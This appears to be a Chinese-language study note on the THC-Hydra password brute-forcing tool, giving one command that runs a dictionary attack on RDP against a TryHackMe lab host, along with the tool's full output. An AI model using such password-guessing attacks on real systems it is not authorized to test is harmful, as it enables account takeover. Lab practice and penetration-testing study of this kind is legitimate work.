# hydra
這是一個用來「線上暴力 / 字典密碼嘗試」的工具：THC‑Hydra（通常簡稱 hydra），常在滲透測試/CTF/實驗室環境用來測試服務（SSH、RDP、FTP、HTTP 表單、SMB 等）的密碼強度。

## 使用範例

### RDP

爆破RDP，指定使用者，密碼用字典，threads 1，timeout 3s
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ hydra -l Jareth -P labyrinth.txt owl.thm rdp -t 1 -w 3
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-31 13:33:25
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 1 task per 1 server, overall 1 task, 23 login tries (l:1/p:23), ~23 tries per task
[DATA] attacking rdp://owl.thm:3389/
[3389][rdp] account on 10.10.3.171 might be valid but account not active for remote desktop: login: Jareth password: [REDACTED], continuing attacking the account.
[STATUS] 8.00 tries/min, 8 tries in 00:01h, 15 to do in 00:02h, 1 active
[STATUS] 8.50 tries/min, 17 tries in 00:02h, 6 to do in 00:01h, 1 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-31 13:36:07

```